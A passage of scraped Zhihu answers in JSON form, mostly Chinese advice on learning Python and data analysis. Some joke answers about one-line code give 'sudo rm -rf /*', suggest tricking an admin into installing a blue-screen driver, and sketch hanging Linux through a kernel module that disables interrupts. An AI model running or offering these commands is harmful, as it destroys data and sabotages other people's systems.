data-original=\"https://pic3.zhimg.com/v2-4e64f07e6430ae1c59feca04d38055b2_r.jpg\"&gt;通过回顾用git版本控制工具记载下来的日志，以及版本对比功能，你可以清楚看到自己是在何时利用什么方法解决了这些问题。然后别忘了，给自己工具箱里的新增小技能打个勾。一个个小问题逐渐被你攻克的时候，你才能真正感受到所学技能的价值，并且点滴积累自信。讨论你学会Python了吗？你是用什么方法学会的？可否把你的学习心得体会分享给大家？对本文推荐的资源和路径，你有什么不同的意见，或者更好的建议？欢迎留言，记录下你的思考，我们一起交流讨论。喜欢请点赞。还可以微信关注和置顶我的公众号“玉树芝兰”(nkwangshuyi)。如果你对数据科学感兴趣，不妨阅读我的系列教程索引贴《如何高效入门数据科学？》，里面还有更多的有趣问题及解法。", "praise_num": 2633, "answer_object_id": "628614cf8bb13863ea26ce3f7823e170"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/479403570", "answer_id": 479403570, "comments_num": 178, "answer_article": "领导：小张，这文件夹里有98个PPT，你把它们的文件名统计一下，给我一个txt。小张：给我10秒。1.新建文本文档2.dir \\\\?\\%1 /a:-d /b /o /p /w &gt;FileList.txt3.重命名为Fake.bat4.将文件夹拖到bat上小张：老板，搞定了！顺便还做了一个自动输出的工具，您可以用。领导：小伙挺能干的，我这里还有很多活儿，都给你吧。对了，记得全部自动化啊。^-^代码来自：rainssong/RainsScriptLib常见问题：为什么不直接输入代码，还写个bat？&gt;复用为什么不用tree命令？&gt;会输出多余文字为什么不用dir &gt;out.txt&gt;省掉参数会输出多余信息，不符合老板要求", "praise_num": 2099, "answer_object_id": "2556d570ef8fb78444cc5d37d378ed86"},{"answer_url": "https://www.zhihu.com/question/284886698/answer/444579123", "answer_id": 444579123, "comments_num": 49, "answer_article": "写个驱动，调用蓝屏函数，骗人admin装上，一行。以后每次开机自动蓝屏，比fork更高级。", "praise_num": 400, "answer_object_id": "8e9318fb3c58dedcf16caed951af85f1"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/453517491", "answer_id": 453517491, "comments_num": 48, "answer_article": "C/C++/js这种，一行代码基本可以做到你能想到的能用这种语言去做的绝大多数事情----反正换行符不是必要的", "praise_num": 271, "answer_object_id": "604ef2cab26176c05478f6ac0aed3f09"},{"answer_url": "https://www.zhihu.com/question/22119753/answer/280016005", "answer_id": 280016005, "comments_num": 18, "answer_article": "我虽然是技术出身，其实在跳槽到腾讯之后，一开始数据分析的事情做的并不多。反而是因为碰到了一些真实的问题，所以想到要用爬虫和数据分析的方法找到答案，所以开始会学习更多爬虫和数据分析相关的知识。一般来说数据分析的流程：定义问题--&gt;数据采集---&gt;数据清理--&gt;数据建模---&gt;分析并输出结论在我看来，业余时间学习爬虫或者是数据分析并不容易，有一定的学习曲线。真正能够帮助你克服困难的是先完成一些有成就感的事情，也就是找到一些你愿意去解决的问题：-看到一张美女图片，想到如何用爬虫批量获取妹子图-尝试学习一个新领域，可以先爬取和分析一下知乎上这个领域的精华回答都讲了些什么-发生了一个热点事件，爬取用户们的不同看法，并且进行可视化的数据分析业余时间学习数据分析往往面临三大挑战：1）动机不足，碰到困难浅尝则止2）缺少像学生一样整块的学习时间3）缺少专业反馈，不知道努力方向是否正确所以，在业余时间学习数据分析第一是要你面对的问题够有趣，第二是学习单元足够小，能够在3-5分钟学完一个小知识点，当然如果有导师的督促和review就更好了。以下提供一个我自己实践过由浅入深的数据分析学习路径。1.用造数saas类的爬虫工具，不需要编程，点几下鼠标就可以获取到自己想要的源数据（电商价格数据，新闻网站舆情数等）。好处是上手比较快，很容易帮助我们解决数没有数据可分析的问题。缺点是对于数据分析的新手虽然可以比较简单快速的拿到自己想要的数据，但是有一部分人停留于用这种saas工具去获取数据和分析数据，缺少对于数据分析的深刻理解。2.学习python，装好环境，调用现成的python库，爬知乎这类开放的社区。我知道有一位开发者7sDream 在github上有一个库 zhihu-oauth 7sDream 在github上有一个库 zhihu-oauth，是可以方便我们快速获取知乎相关的一些数据接口。我的成品：知乎简史1：为了理解知乎，我分析了创始人的2699个回答和200位种子用户知乎简史1：为了理解知乎，我分析了创始人的2699个回答和200位种子用户这种方式的好处是可以定制化的获取自己想要的数据，数据的来源和格式我们都可以编程实现定制。缺点是我们需要根据每一个数据源的数据结构针对性的做一些分析，同时由于这一阶段我们用的数据呈现工具PPT、excel等还比较简单，很难对数据进行多维度的分析 或者是进行一种更加直观的呈现。3.真正的想要让你的数据发挥价值，就要用到tableu等数据分析进阶工具。 Tableau有免费试用，如果你学生的话可以在 Tableau 学生版 他们的官网下载到学生版本，上传学生证认证即可免费使用。 Tableau支持对于数据进行不同维度的分析，而且提供了近百种不同的数据呈现方式。Tableau的操作还是有一点复杂，光是自己尝试想要摸清楚并不容易，我现在是结合udacity(优达学城)数据分析师课程一起看，里面除了课程视频还有一些数据集、案例、练习帮助我们快速上手类似 Tableau这类数据分析工具Udacity的课程本身是和Tableau官方合作的，同时的进阶数据分析课程还带6个月的Tableau的付费license。数据分析进阶学习材料：1）python编程：@路人甲的 知乎专栏“学习编程” ,里面有很多他自己做python开发和数据分析的心得。2）爬虫这块：崔庆才的Python爬虫学习系列教程-进阶部分，会讲解Pyspider等爬虫框架3）tableu等数据分析/可视化工具：我最近在学习数据分析师这一节准备把自己比较丑的数据可视化和数据透视这两块加强一下。 优达在线课程是一个知识点一个视频录制的，可以高度保持注意力，单个知识点只需要3-5分钟就可以学完，同时也有导师督促和审阅项目，这点还是挺吸引我的。udacity的数据分析课程中有一张图，特别直观的体现了针对不同的数据分析任务，我们可以用怎样的数据图来体现不同的关系：时间序列，对比，相关性分析，构成关系。--时间序列：时序图，折线图--对比：柱状图--相关性分析：气泡图--构成关系：成分图、饼图数据分析大多数时候也就是在分析时序、相关性、对比、构成这四类关系，数据分析这件事本身就可以用数据图表的方式被如此精炼的表达出来。我觉得很直观的总结了数据分析的本质，学习数据分析，本质上是在帮助我们从数据的维度更好的理解不同行业，和我们现在所处的这个世界。我想，这就是数据分析之美吧....", "praise_num": 464, "answer_object_id": "2d39223417a3123882e7e7d4f2cce814"},{"answer_url": "https://www.zhihu.com/question/29138020/answer/72193349", "answer_id": 72193349, "comments_num": 112, "answer_article": "是否非常想学好 Python，一方面被琐事纠缠，一直没能动手，另一方面，担心学习成本太高，心里默默敲着退堂鼓？幸运的是，Python 是一门初学者友好的编程语言，想要完全掌握它，你不必花上太多的时间和精力。Python 的设计哲学之一就是简单易学，体现在两个方面：语法简洁明了：相对 Ruby 和 Perl，它的语法特性不多不少，大多数都很简单直接，不玩儿玄学。切入点很多：Python 可以让你可以做很多事情，科学计算和数据分析、爬虫、Web 网站、游戏、命令行实用工具等等等等，总有一个是你感兴趣并且愿意投入时间的。废话不多说，学会一门语言的捷径只有一个： Getting Started¶ 起步阶段任何一种编程语言都包含两个部分：硬知识和软知识，起步阶段的主要任务是掌握硬知识。°1 硬知识“硬知识”指的是编程语言的语法、算法和数据结构、编程范式等，例如：变量和类型、循环语句、分支、函数、类。这部分知识也是具有普适性的，看上去是掌握了一种语法，实际是建立了一种思维。例如：让一个 Java 程序员去学习 Python，他可以很快的将 Java 中的学到的面向对象的知识 map 到 Python 中来，因此能够快速掌握 Python 中面向对象的特性。如果你是刚开始学习编程的新手，一本可靠的语法书是非常重要的。它看上去可能非常枯燥乏味，但对于建立稳固的编程思维是必不可少。下面列出了一些适合初学者入门的教学材料：❖「笨方法学 Python」：http://learnpythonthehardway.org/book/这本书在讲解 Python 的语法成分时，还附带大量可实践的例子，非常适合快速起步。❖「廖雪峰的 Python 2.7 教程」：Home - 廖雪峰的官方网站Python 中文教程的翘楚，专为刚刚步入程序世界的小白打造。❖「The Hitchhiker’s Guide to Python!」：The Hitchhiker’s Guide to Python!这本指南着重于 Python 的最佳实践，不管你是 Python 专家还是新手，都能获得极大的帮助。❖「Python 官方文档」：Our Documentation实践中大部分问题，都可以在官方文档中找到答案。❖ 辅助工具：Python Tutor一个 Python 对象可视化的项目，用图形辅助你理解 Python 中的各种概念。Python 的哲学：用一种方法，最好是只有一种方法来做一件事。学习也是一样，虽然推荐了多种学习资料，但实际学习的时候，最好只选择其中的一个，坚持看完。必要的时候，可能需要阅读讲解数据结构和算法的书，这些知识对于理解和使用 Python 中的对象模型有着很大的帮助。°2 软知识“软知识”则是特定语言环境下的语法技巧、类库的使用、IDE的选择等等。这一部分，即使完全不了解不会使用，也不会妨碍你去编程，只不过写出的程序，看上去显得“傻”了些。对这些知识的学习，取决于你尝试解决的问题的领域和深度。对初学者而言，起步阶段极易走火，或者在选择 Python 版本时徘徊不决，一会儿看 2.7 一会儿又转到 3.0，或者徜徉在类库的大海中无法自拔，Scrapy，Numpy，Django 什么都要试试，或者参与编辑器圣战、大括号缩进探究、操作系统辩论赛等无意义活动，或者整天跪舔语法糖，老想着怎么一行代码把所有的事情做完，或者去构想圣洁的性能安全通用性健壮性全部满分的解决方案。很多“大牛”都会告诫初学者，用这个用那个，少走弯路，这样反而把初学者推向了真正的弯路。还不如告诉初学者，学习本来就是个需要你去走弯路出 Bug，只能脚踏实地，没有奇迹只有狗屎的过程。选择一个方向先走下去，哪怕脏丑差，走不动了再看看有没有更好的解决途径。自己走了弯路，你才知道这么做的好处，才能理解为什么人们可以手写状态机去匹配却偏要发明正则表达式，为什么面向过程可以解决却偏要面向对象，为什么我可以操纵每一根指针却偏要自动管理内存，为什么我可以嵌套回调却偏要用 Promise...更重要的时，你会明白，高层次的解决方法都是对低层次的封装，并不是任何情况下都是最有效最合适的。技术涌进就像波浪一样，那些陈旧的封存已久的技术，消退了迟早还会涌回的。就像现在移动端应用、手游和 HTML5 的火热，某些方面不正在重演过去 PC 的那些历史么？因此，不要担心自己走错路误了终身，坚持并保持进步才是正道。起步阶段的核心任务是掌握硬知识，软知识做适当了解，有了稳固的根，粗壮的枝干，才能长出浓密的叶子，结出甜美的果实。¶ 发展阶段完成了基础知识的学习，必定会感到一阵空虚，怀疑这些语法知识是不是真的有用。没错，你的怀疑是非常正确的。要让 Python 发挥出它的价值，当然不能停留在语法层面。发展阶段的核心任务，就是“跳出 Python，拥抱世界”。在你面前会有多个分支：科学计算和数据分析、爬虫、Web 网站、游戏、命令行实用工具等等等等，这些都不是仅仅知道 Python 语法就能解决的问题。拿爬虫举例，如果你对计算机网络，HTTP协议，HTML，文本编码，JSON一无所知，你能做好这部分的工作么？而你在起步阶段的基础知识也同样重要，如果你连循环递归怎么写都还要查文档，连 BFS 都不知道怎么实现，这就像工匠做石凳每次起锤都要思考锤子怎么使用一样，非常低效。在这个阶段，不可避免要接触大量类库，阅读大量书籍的。°1 类库方面「Awesome Python 项目」：vinta/awesome-python · GitHub这里列出了你在尝试解决各种实际问题时，Python 社区已有的工具型类库，如下图所示：&lt;img src=\"https://pic1.zhimg.com/6c1f92cc8dcafe556369c272346852c8_b.png\" data-rawwidth=\"1454\" data-rawheight=\"1348\" class=\"origin_image zh-lightbox-thumb\" width=\"1454\" data-original=\"https://pic1.zhimg.com/6c1f92cc8dcafe556369c272346852c8_r.jpg\"&gt;你可以按照实际需求，寻找你需要的类库。至于相关类库如何使用，必须掌握的技能便是阅读文档。由于开源社区大多数文档都是英文写成的，所以，英语不好的同学，需要恶补下。°2 书籍方面：这里我只列出一些我觉得比较有一些帮助的书籍，详细的请看豆瓣的书评：科学和数据分析：❖「集体智慧编程」：集体智慧编程 (豆瓣)❖「数学之美」：数学之美 (豆瓣)❖「统计学习方法」：统计学习方法 (豆瓣)❖「Pattern Recognition And Machine Learning」：Pattern Recognition And Machine Learning (豆瓣)❖「数据科学实战」：数据科学实战 (豆瓣)❖「数据检索导论」：信息检索导论 (豆瓣)爬虫：❖「HTTP 权威指南」：HTTP权威指南 (豆瓣)Web 网站：❖「HTML &amp; CSS 设计与构建网站」：HTML &amp; CSS设计与构建网站 (豆瓣)... 列到这里已经不需要继续了。聪明的你一定会发现上面的大部分书籍，并不是讲 Python 的书，而更多的是专业知识。事实上，这里所谓“跳出 Python，拥抱世界”，其实是发现 Python 和专业知识相结合，能够解决很多实际问题。这个阶段能走到什么程度，更多的取决于自己的专业知识。¶ 深入阶段这个阶段的你，对 Python 几乎了如指掌，那么你一定知道 Python 是用 C 语言实现的。可是 Python 对象的“动态特征”是怎么用相对底层，连自动内存管理都没有的C语言实现的呢？这时候就不能停留在表面了，勇敢的拆开 Python 的黑盒子，深入到语言的内部，去看它的历史，读它的源码，才能真正理解它的设计思路。这里推荐一本书：「Python 源码剖析」：Python源码剖析 (豆瓣)这本书把 Python 源码中最核心的部分，给出了详细的阐释，不过阅读此书需要对 C 语言内存模型和指针有着很好的理解。另外，Python 本身是一门杂糅多种范式的动态语言，也就是说，相对于 C 的过程式、 Haskell 等的函数式、Java 基于类的面向对象而言，它都不够纯粹。换而言之，编程语言的“道学”，在 Python 中只能有限的体悟。学习某种编程范式时，从那些面向这种范式更加纯粹的语言出发，才能有更深刻的理解，也能了解到 Python 语言的根源。这里推荐一门公开课「编程范式」：斯坦福大学公开课：编程范式讲师高屋建瓴，从各种编程范式的代表语言出发，给出了每种编程范式最核心的思想。值得一提的是，这门课程对C语言有非常深入的讲解，例如C语言的范型和内存管理。这些知识，对阅读 Python 源码也有大有帮助。Python 的许多最佳实践都隐藏在那些众所周知的框架和类库中，例如 Django、Tornado 等等。在它们的源代码中淘金，也是个不错的选择。¶  最后的话每个人学编程的道路都是不一样的，其实大都殊途同归，没有迷路的人只有不能坚持的人。虽然听上去有点鸡汤，但是这是事实。希望想学 Python 想学编程的同学，不要犹豫了，看完这篇文章，Just getting started～另外，欢迎私信本喵交流 Python 的学习经验哦 &gt; .&lt;", "praise_num": 5378, "answer_object_id": "8c6ab5ee001b48265be3999434fc55c2"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/453251748", "answer_id": 453251748, "comments_num": 182, "answer_article": "sudo rm -rf /*能让你跑路或者被tjjtds评论区：你们的输入法经历了什么…&lt;img src=\"https://pic1.zhimg.com/v2-0e0b877c3cd96a7cf38c3a75c16069fc_b.gif\" data-rawwidth=\"296\" data-rawheight=\"182\" data-size=\"normal\" data-caption=\"\" data-thumbnail=\"https://pic1.zhimg.com/v2-0e0b877c3cd96a7cf38c3a75c16069fc_b.jpg\" class=\"content_image\" width=\"296\"&gt;", "praise_num": 402, "answer_object_id": "835887ac1a52682441e40c7d66dc91bd"},{"answer_url": "https://www.zhihu.com/question/284886698/answer/443423658", "answer_id": 443423658, "comments_num": 16, "answer_article": "理论上，fork bombs,很容易拦掉，自己google就好了。首先你怎么定义死机。我理解的死机就是所有硬线程都被占用并且无法响应任何中断。linux，你的代码可以 insmod进去，当然需要root，开等同于硬线程的几个线程，关中断，关调度，基本就对任何信号也不反应，linux内核的spin lock就是这样实现的，出一个加分题，怎么把这样的线程打断让出cpu？看球没时间写代码，你可以去看linux自旋锁怎么实现的照猫画虎关就行了。还是有中断关不掉的，请问是什么中断？只要还在响应中断，都不算死机吧。因为内核的内存是预留的，而且os可以配每个进程多少内存，进程总数配也没关系。没有root，不能注入代码，怎么办呢？你只有ssh上来的，也不能拔电。这个就麻烦了，没有通用的办法，问搞安全的人吧。", "praise_num": 94, "answer_object_id": "467620eada9582171ac850b60c64c3ea"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/475593167", "answer_id": 475593167, "comments_num": 703, "answer_article": "在Linux下：sudo apt-get install hollywood cmatrix            如果你修电脑，请记得在女生面前展示这一技能，然后装作淡定的快速敲击键盘，相信我，完全好莱坞黑客镜头范，妹子肯定会膜拜死你的！1.讲真的，评论区这么多杠精真的好吗？妹子会不会linux不重要啊，你难道不会做一个盘嘛！学会把机会把握在自己手里啊。2.其次是sorry啊，昨晚我只是脑洞想到这行代码而已，没有考虑到RPM 和DPKG下的使用指令区别。", "praise_num": 6626, "answer_object_id": "6bc94be5aaa5571992b1c9ad5ad627a0"},{"answer_url": "https://www.zhihu.com/question/22119753/answer/243669266", "answer_id": 243669266, "comments_num": 23, "answer_article": "高票答案分两种。一是提供学习资源的，各种经典书籍、网站教程，都很好，能够为初学者减少很多资源筛选的时间。但对于很多浮躁的小白来说，无疑是目标缺失的，每一部分学完能做什么，如何应用，是一个很大的问题。这样的学习，很容易未入门就放弃，所以并不建议从啃一本书开始。另一种是从实际的问题场景入手的。这确实是一个不错的方式，因为模拟了一个数据分析问题解决的流程。但这对于没有数据分析经验的人，特别是不怎么了解业务的人来说，这种方式又会陷入另一种困境：如何提出高质量的问题、如何找到清晰的分析思路。数据分析的思维是在有经验之后才能够养成的，而这种方式要求一开始就具备这种分析的思维，如果不懂业务问题，其实很难有针对性地去分析一个问题。我们就从数据分析技术和数据分析思维的养成，来谈谈如何在业余时间高效学习数据分析。主要是给更多的人一条相对平滑的、简单的学习路径，让学习的过程变成实践的过程，每个阶段都能输出成果。先给出一条学习路径吧：开始用数据玩起来好像少点统计学知识数据不干净怎么办握草！python大法流弊SQL打开新世界的大门数据分析的思维通向更高的维度1.开始用数据玩起来你可能会疑惑：我什么都不会，你就让我玩起来？不急，我们慢慢来解答。题主可能没什么数据分析的基础，但至少你还会编程，这比起很多小白来说这是一个相当大的优势。当然你可能觉得应该循序渐进地看书学习，但无数人从入门到放弃的经验告诉我们，那个过程本身就是不人性化的，特别是对于碎片化的学习来说。怎么开始用数据玩起来呢？先找一个数据集，如果你工作中有一些现成的数据（用户数据、销售数据、产品数据等），是最好的，因为这些数据跟你的认知是高度相关的，能让你更加的有针对性。当然如果没有这样的数据资源的话，也可以找一些网上的公开数据集，推荐几个有公开数据集的网站。UCI：加州大学欧文分校开放的经典数据集，真的很经典，被很多机器学习实验室采用，强烈建议前期数据集缺乏并且不想花太多时间去找的情况下用这里面的数据。国家数据：数据来源于中国国家统计局，包含了我国经济民生等多个方面的数据。CEIC：超过128个国家的经济数据，能够精确查找GDP, CPI, 进口，出口，外资直接投资，零售，销售，以及国际利率等深度数据。中国统计信息网：国家统计局的官方网站，汇集了海量的全国各级政府各年度的国民经济和社会发展统计信息。拿到这些数据，你就可以进行一些探索性的分析了。最常见的，就是把这些数据用可视化方式描述出来，最常见的就是 Excel，在把数据转化成图像的过程中，你就会发现一些数据分布的特点。比如你拿到一个产品的销售数据，把数据按照时间序列绘制出图形，那就可以看到销量与时间、季节、特殊节点之间的关系；当你分地区来展示，你可以看到产品受不同地区用户的喜爱程度；当你把销售数据和其他的一些因素结合起来（比如推广行为），可以发现这些因素对销售量的影响。你看，其实冰冷的数据在进行图形化的展示之后，我们可以发现很多基本的规律，这个已经可以得出一些很有用的知识了。所以你看，其实你已经可以开始进行基本的数据分析了。当然如果你也不怎么熟悉 Excel 的话，去熟悉一些这些基本的图表的用法，我们经常用到的也基本是条形图、折线图（散点图）、扇形图。&lt;img src=\"https://pic3.zhimg.com/v2-4c374179faef9a8c1c60e92627142bfa_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2110\" data-rawheight=\"820\" class=\"origin_image zh-lightbox-thumb\" width=\"2110\" data-original=\"https://pic3.zhimg.com/v2-4c374179faef9a8c1c60e92627142bfa_r.jpg\"&gt;&lt;img src=\"https://pic3.zhimg.com/v2-a49a40600281284236a0e4abf2f7c786_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1872\" data-rawheight=\"760\" class=\"origin_image zh-lightbox-thumb\" width=\"1872\" data-original=\"https://pic3.zhimg.com/v2-a49a40600281284236a0e4abf2f7c786_r.jpg\"&gt;觉得很简单是吧，当然可视化你还可以去了解用编程的方式去实现，比如 python里面的seaborn、matplotlib，R里面的ggplot2，这些都是很好的可视化工具（这对于题主来说应该是小case）。小白也不要以为很难，这个阶段你并不需要系统地去学习python或者R，只需要了解这些库的一些基本函数和用法就可以了。比如下面这些图，在python里面就是一行命令的事情。&lt;img src=\"https://pic4.zhimg.com/v2-5421370f9bebd02dac51a5cff37b7aff_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2002\" data-rawheight=\"840\" class=\"origin_image zh-lightbox-thumb\" width=\"2002\" data-original=\"https://pic4.zhimg.com/v2-5421370f9bebd02dac51a5cff37b7aff_r.jpg\"&gt;&lt;img src=\"https://pic3.zhimg.com/v2-ad58530dc81d5262f2712fe444082e9e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2028\" data-rawheight=\"772\" class=\"origin_image zh-lightbox-thumb\" width=\"2028\" data-original=\"https://pic3.zhimg.com/v2-ad58530dc81d5262f2712fe444082e9e_r.jpg\"&gt;&lt;img src=\"https://pic2.zhimg.com/v2-b913e072a1606e1bd515d77a02ebdf25_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1982\" data-rawheight=\"804\" class=\"origin_image zh-lightbox-thumb\" width=\"1982\" data-original=\"https://pic2.zhimg.com/v2-b913e072a1606e1bd515d77a02ebdf25_r.jpg\"&gt;网上有很多这些可视化工具的教程，跟着做很容易上手，主要是记住具体的函数、方法的使用方式，多联系一下就可以了。当然不是让你瞎玩，画几个图虽然简单，但这还远远不够，在画图的过程中，你需要真正去做一些思考，从这些可视化的图表中，你能够可能发现哪些规律，你可尝试输出一些简单的结论和报告。2.好像少了点统计学知识如果你用可视化的形式做了一些探索性的数据分析，那么你就会发现，得到的知识并不是那么多，那么，如何做更加精细化的分析呢？这个时候你需要补充一些统计学的知识了。因为网上其实很少有系统的统计学的学习资料，这里更加推荐去看一些统计学方面的书籍。推荐书：深入浅出统计学 (豆瓣)在具体的数据分析中，主要用到统计方面的以下知识，在看书的时候重点学习：基本的统计量：均值、中位数、众数、方差、标准差、百分位数等；概率分布：几何分布、二项分布、泊松分布、正态分布等；总体和样本：了解基本概念，抽样的概念；置信区间与假设检验：如何进行验证分析；相关性与回归分析：一般数据分析的基本模型。那通过基本的统计量，你可以进行更多元化的可视化，以实现更加精细化的数据分析，这个时候也需要你去了解更多的Excel函数来实现基本的计算，或者python、R里面一些对应的可视化方法。有了总体和样本的概念，你就知道在面对大规模数据的时候，怎样去进行抽样分析。你也可以应用假设检验的方法，对一些感性的假设做出更加精确地检验。利用回归分析的方法，你可以对未来的一些数据、缺失的数据做基本的预测。了解统计学的原理之后，你不一定能够通过工具实现，那么你需要去对应的找网上找相关的实现方法。也可以看书，先推荐一本非常简单的： 深入浅出数据分析 (豆瓣)。3.数据不干净怎么办很多时候我们拿到的数据是不干净的，数据的重复、缺失、异常值等等，这时候就需要进行数据的清洗，把这些影响分析的数据处理好，才能获得更加精确地分析结果。比如空气质量的数据，其中有很多天的数据由于设备的原因是没有监测到的，有一些数据是记录重复的，还有一些数据是设备故障时监测无效的。比如用户行为数据，有很多无效的操作对分析没有意义，就需要进行删除。那么我们需要用相应的方法去处理，比如残缺数据，我们是直接去掉这条数据，还是用临近的值去补全，这些都是需要考虑的问题。对于数据预处理，学会 pandas 的用法，应对一般的数据清洗就完全没问题了。需要掌握的知识点如下：选择：数据访问（标签、特定值、布尔索引等）缺失值处理：对缺失数据行进行删除或填充重复值处理：重复值的判断与删除空格和异常值处理：清楚不必要的空格和极端、异常数据相关操作：描述性统计、Apply、直方图等合并：符合各种逻辑关系的合并操作分组：数据划分、分别执行函数、数据重组Reshaping：快速生成数据透视表网上有很多pandas的教程，主要是一些函数的应用，也都非常简单，如果遇到问题，可以参看pandas操作的官方文档。4.握草，Python大法流弊通过pandas，你可能已经意识到，python真实一个神奇的东西。但除了pandas，python还有其他优秀的数据分析、数据挖掘的库，比如numpy、scipy、scikit-learn，那你可以去找一些教程来看看如何通过这些库实现数据分析，先搞清楚那些最常用的方法，并结合实际的数据集进行练习。那些并不常用的方法，可以等到在遇到具体的问题的时候再去查阅相关的文档。比如利用numpy进行数组的计算，利用scipy实现不同的假设检验，利用scikit-learn实现完整的数据分析建模……这些网上有很多可以学习的教程，当然也可以去看书，推荐一本：利用Python进行数据分析 (豆瓣)当然前期并不建议你去追求各种高深的技巧，你更需要去熟悉最基本的用法，毕竟基本的才是最常用到的，常用的方法已经可以帮助你解决绝大部分初级阶段的数据分析问题了。比如利用回归分析（线性回归、逻辑回归），你就可以去实现很多的预测型的数据分析，对未来的数据进行预测。题主python这部分应该没问题了，只需要去了解相关的库即可。当然，如果是小白，还需要去了解一些python的基础知识，比如变量、基本元素等，如果你对python无感，那么R语言也完全可以帮助你解决数据分析问题。5.用SQL打开新世界的大门在应对万以内的数据的时候，Excel对于一般的分析没有问题，一旦数据量大，就会力不从心，打开文件都会是个问题，数据库就能够很好地解。而且大多数的企业，都会以SQL的形式来存储数据，如果你是一个分析师，也需要懂得SQL的操作，能够查询、提取数据。SQL作为最经典的数据库工具，为海量数据的存储与管理提供可能，并且使数据的提取的效率大大提升。你需要掌握以下技能：提取特定情况下的数据：企业数据库里的数据一定是大而繁复的，你需要提取你需要的那一部分。比如你可以根据你的需要提取2017年所有的销售数据、提取今年销量最大的50件商品的数据、提取上海、广东地区用户的消费数据……，SQL可以通过简单的命令帮你完成这些工作。数据库的增、删、查、改：这些是数据库最基本的操作，但只要用简单的命令就能够实现，所以你只需要记住命令就好。数据的分组聚合、如何建立多个表之间的联系：这个部分是SQL的进阶操作，多个表之间的关联，在你处理多维度、多个数据集的时候非常有用，这也让你可以去处理更复杂的数据。SQL这个部分相对来说比较简单，可以去这个教程：MySQL-菜鸟教程 当然如果你一直面对的是不那么大的数据，或者pandas等工具已经够你用了，那你也可以暂时不了解SQL这一块相对独立的知识。6.数据分析思维如果你对业务本身有一定了解，那么你可能在数据思维的养成方面会更加有优势，你会知道哪些因素、哪些数据是相对重要的，那么你可以在分析中更加容易地找出重要的问题，也能够更清楚应该从哪些方面入手，这就是问题定义的过程。这是数据分析的第一个步骤，但往往要经过很多的实战训练才能养成。开始的时候，你可能考虑的问题不是很周全，但随着你经验的积累，慢慢就会找到分析的方向，有哪些一般分析的维度，比如top榜单、平均水平、区域分布、年龄分布、相关性分析、未来趋势预测等等。随着经验的增加，你会有一些自己对于数据的感觉，这就是我们通常说的数据思维了。你也可以看看行业的分析报告，推荐：艾瑞咨询 看看优秀的分析师看待问题的角度和分析问题的维度，你也可以去参考优秀数据分析师的一些思考维度去进行分析，总结的多了，你会发现，其实这并不是一件困难的事情。如果你想去获取互联网的一些数据，也可以学学爬虫的一些技能，基于互联网的数据，可以做很多的市场调研和舆情分析。7.通向更高的维度如果你并不满足做基础的数据分析，甚至想做一些数据挖掘、机器学习的事情，那么你还需要学习更多的知识。了解更高级的数据挖掘算法，比如决策树、随机森林、支持向量机、神经网络等等，光了解算法还不够，你还需要知道如何进行模型的优化，如何通过特征工程、模型融合提升预测的精确度。这就有点数据挖掘和机器学习的味道了。当然你可以根据你的职业发展来选择具体的方向，如果你在编程、算法上面比较有兴趣，那么你可以向更深入的机器学习方向发展；如果你更想往业务方向靠拢，以数据分析来支撑商业决策，那么你可以深化这方面的能力，甚至去考虑做一些自动化分析的事情。总的来说，学习的动力源于反馈，在碎片化学习的时候，尤其注意，你的每个学习过程都应该是有具体的目的导向的，你也需要考虑，学习这个知识点，最终想输出的东西是什么。每个阶段只学习最需要的那部分知识，这样可以很大程度上地提升学习效率。如果你觉得学习资源的收集甄别浪费时间，也可以看看我们花大力气制作的体系的数据分析课程：数据分析师（入门）-DC学院关注公众号（datacastle2016），获取更多数据分析干货。", "praise_num": 376, "answer_object_id": "dd95f187b39cdac39656fa527df32d03"},{"answer_url": "https://www.zhihu.com/question/29138020/answer/141170242", "answer_id": 141170242, "comments_num": 159, "answer_article": "我是真正零基础开始学Python的，从一开始的一窍不通，到3个月后成功搭建了一个动态网站（没有用任何框架）。相比于计算机大牛，我更加知道一个小白将会遇到什么坑，遇到哪些难点。我把我的学习过程写在下面，并附上在每个阶段的学习资料，希望对零基础的Python学习者有所帮助。注：本文只做经历分享，不是技术探讨。---在知乎上常常看到想要转行IT，或者是想学习编程但不知如何开始的朋友。回答这类问题的人往往只是列出书单资源然后给出一个大致的方向。有些朋友一开始就扎入了理论学习的汪洋大海，从苦读类似《算法导论》开始，能够坚持读下来的寥寥无几，学习的积极性也被不断的挫败感消磨的所剩无几。一直以来，编程对我而言是一种「黑魔法」般的存在。今年阿里月饼门，当很多人都参与到是非之争的时候，我更加着迷于程序员区区几行代码的脚本所展现出的威力，对于外行而言，这是超乎他们想象之外的某种能力——为什么我守在电脑面前盯着秒针然后拼命点击鼠标都不一定能抢到的礼物，程序员只需要提前花5分钟写3行代码就轻松搞定？所以，我的心底深处一直都想变成这样的一位魔法师。今年的8月，刚好工作上想要开发一个基于微信的英语学习网站，借此机会，我决定好好学习一下编程。在此之前，我所有关于程序的知识仅仅来源于两部分，一是本科时期的C语言必修课，现在已经忘的一干二净，不过好歹我从中明白编程是怎么回事；第二部分是大概两年前由于工作关系学的一些Python，不过只是皮毛，现在忘的七七八八。简单说，我的目标是建立一个网站，不过这个网站是动态的，也就是说它能识别谁登陆，然后对不同的人显示不同的内容。而当时的现实是，我完全不明白网页是如何显示出来的？譬如每个人登陆知乎的时候看到的是定制化的页面，后台是如何基于每个ID来组织出不同的页面的？所有我们看到的问题，回答，参与的评论在背后的服务器上是以一种什么样的形式存在的？又比如为什么有些页面只能在微信端打开，在电脑上就会出错？（不知道你有没有发现这一点）当时我的心中充满了无数个类似的问号？当然如果你也是小白，一定有着同样的疑问。好处是一开始就明确了学习的目的：Web建站。所以我的学习方案基本就是通过做项目学习，哪里不懂就解决哪里，边做边学习，不断推进。另外，由于知道很多成功的网站在用Python做服务器开发，比如知乎，所以我就自然选择了Python。于是我就开始了我充满着挫败感和成就感的编程之路……从8月到12月的四个月里，除去本来的工作，为了学习质量，我会保证平均每天4个小时的学习时间，周末也不例外。另外，所有的文档，问答都尽量看英文的，这可以帮你剩下大量的时间。12月13日，我做的网站上线了，3天时间大概有5000人访问了这个网站，我有时在后台看着日志，不免有些心潮喷涌，我想